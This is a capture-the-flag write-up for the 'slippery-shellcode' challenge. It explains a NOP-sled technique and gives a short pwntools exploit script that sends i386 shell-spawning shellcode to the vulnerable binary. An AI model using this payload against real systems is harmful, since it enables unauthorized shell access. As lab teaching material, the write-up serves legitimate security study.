# slippery-shellcode - 200pt

### Challenge ###
> LThis program is a little bit more tricky. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/slippery-shellcode_2_4061c12f5a4a9d8c1c3f45b25fbcb09a on the shell server.

### Hints ###
> Here we've no hints

### Solution ###
>We have an executable that asks a shellcode and, after that we've provided it, the program execute it starting by a random position in the exploit string.
This position is pointed by an index composed by start position and an offet = rand() % 256.

### Executing the exploit ###
> The great size of buffer (512) allows us to provide 256 nops and then send our shellcode to be sure that it will be executed.
So we can send an exploit composed as follows:

    garbage = "\x90" * 256
    exploit = garbage + shellcode

> To create shellcode we can use shellcraft, a PWNTools method, that provide us a shellcode in function of the architecture of executable and tipe of shellcode that we want.
We want a shellcode that opens a shell and work in i386, we can obtain it as follows:

    shellcode = asm(shellcraft.i386.sh())

> Now we're ready to send our exploit.

### Exploit: ###

    garbage = "\x90" * 256
    shellcode = asm(shellcraft.i386.sh())
    exploit = garbage + shellcode

    p = process("./vuln")
    p.sendline(exploit)
    p.interactive()
